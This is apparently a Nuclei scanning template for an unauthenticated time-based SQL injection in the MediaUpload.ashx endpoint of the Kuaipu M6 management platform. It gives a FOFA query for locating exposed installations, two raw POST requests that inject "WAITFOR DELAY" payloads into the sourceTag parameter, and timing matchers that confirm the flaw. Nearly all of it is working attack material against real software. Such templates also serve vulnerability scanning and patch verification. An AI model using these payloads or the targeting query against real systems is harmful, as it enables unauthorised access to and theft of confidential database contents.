id: kuaipu-sql-injection
info:
  name: 快普M6 MediaUpload接口前端SQL注入漏洞
  author: 0dayPoc
  severity: high
  description: |-
    fofa: app="快普-M6"

    快普M6作为国内集成化管理平台，在信息化管理领域具有广泛应用。经分析发现其MediaUpload接口存在前端可访问的SQL注入缺陷，攻击者可通过构造特定参数绕过输入验证机制，在未授权情况下执行任意SQL查询，从而实现数据库敏感数据的非法获取。

    该漏洞存在于系统公开访问路径，攻击者无需身份认证即可利用。成功利用可导致用户隐私数据、业务数据等机密信息泄露，严重威胁系统数据安全。

  tags: 快普M6
http:
- raw:
  - |
    POST /ashx/Common/MediaUpload.ashx HTTP/1.1
    Host: {{Hostname}}
    Cache-Control: max-age=0
    Upgrade-Insecure-Requests: 1
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Connection: close
    Content-Type: application/x-www-form-urlencoded

    upload=check&dasdsa=1&sourceTag=11');WAITFOR DELAY '0:0:5'--&field=1
  - |
    POST /ashx/Common/MediaUpload.ashx HTTP/1.1
    Host: {{Hostname}}
    Cache-Control: max-age=0
    Upgrade-Insecure-Requests: 1
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Connection: close
    Content-Type: application/x-www-form-urlencoded

    upload=check&dasdsa=1&sourceTag=11');WAITFOR DELAY '0:0:8'--&field=1
  matchers:
  - type: dsl
    dsl:
    - duration_1>=5 && duration_1<=6
    - duration_2>=8 && duration_2<=9
    condition: and
